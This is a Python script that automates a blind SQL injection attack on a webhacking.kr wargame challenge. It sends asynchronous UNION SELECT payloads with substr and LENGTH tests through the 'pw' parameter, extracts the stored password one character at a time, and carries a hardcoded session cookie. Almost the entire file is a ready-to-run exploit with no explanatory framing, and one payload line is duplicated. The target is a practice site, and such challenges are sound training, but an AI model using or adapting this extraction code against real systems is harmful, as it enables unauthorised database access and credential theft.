import asyncio
import aiohttp
import string

URL = "https://webhacking.kr/challenge/new-12/"
SESSION_ID = "jl75lgpfhd5tibe80ebtki2aaioovvaba"
cookies = {'PHPSESSID':SESSION_ID}

semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    params ={'pw':payload}

    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
    try:
        async with session.post(URL, params=params, timeout=timeout, cookies=cookies) as response:
            return await response.text()
    except asyncio.TimeoutError:
        # print(f"Timeout occurred for payload: {payload}")
        return "timeout"  # Placeholder for timeout

async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f"' union select if(LENGTH(select pw from prob_ouroboros limit 1)='{length}','YAY','c') -- '"
        payload = f"' union select if(LENGTH(select pw from prob_ouroboros limit 1)='{length}','YAY','c') -- '"

        response = await fetch(session, payload)
        if "YAY" in response:
            print(f"Password length found: {length}")
            return length
    return None  # Return None if length not found

async def main():
    async with aiohttp.ClientSession() as session:
        # password_length = await find_password_length(session)
        password_length = 10  # For testing, set a fixed password length
        if password_length is None:
            print("Could not determine password length.")
            return
        
        password = ""
        # character_set = string.ascii_letters + string.digits + string.punctuation + " \t\r\n" + "!" + "?" + "{}"
        character_set = ''.join(chr(i) for i in range(0, 256))  # Printable ASCII chars

        prev = len(password)
        while len(password) < password_length:
            tasks = []
            for c in character_set:  # Iterate through character set
                # payload = f"' union select if(substr((select 'my_password :)' from dual limit 1),{len(password)+1},1)='{c}','YAY','c') -- '"
                payload = f"' union select if(substr((select pw from prob_ouroboros limit 1),{len(password)+1},1)='{c}','YAY','c') -- '"

                tasks.append(fetch(session, payload))
                # print(f"Trying character: {c} with payload: {payload}")

                await asyncio.sleep(0.1)  # Delay between requests

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                # if character_set[index] == 'm':
                # print(f"Debug: Character '{character_set[index]}' at index {index} returned response: {response}")
                if "<h2>" in response and "YAY" in response.split("<h2>")[1].split("</h2>")[0]:
                    c = character_set[index]  # Correctly access character from character set
                    password += c
                    print(password.ljust(password_length, '*'))
                    break
            if prev == len(password):
                print("No new character found, possibly reached the end of the password.")
                break
            else:
                prev += 1

if __name__ == "__main__":
    asyncio.run(main())